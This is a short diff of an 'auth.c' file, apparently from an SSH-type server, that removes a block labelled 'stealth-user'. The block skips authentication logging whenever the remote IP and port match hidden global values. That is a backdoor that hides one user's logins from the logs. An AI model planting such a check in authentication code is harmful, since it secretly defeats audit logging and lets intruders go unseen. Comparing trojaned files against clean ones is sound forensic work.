@@ -1,0 +1,13 @@
+Viewing: 'auth.c'
+Launch 'diff' [Y/n]: 
+276,283d275
+< 
+< 	/*
+< 		In case of stealth-user - skip logging
+< 	*/
+< 	if (strcmp(get_remote_ipaddr(), global_ip)==0 && global_port==get_remote_port()){
+< 		return;
+< 	}
+< 
+302a295
+> 
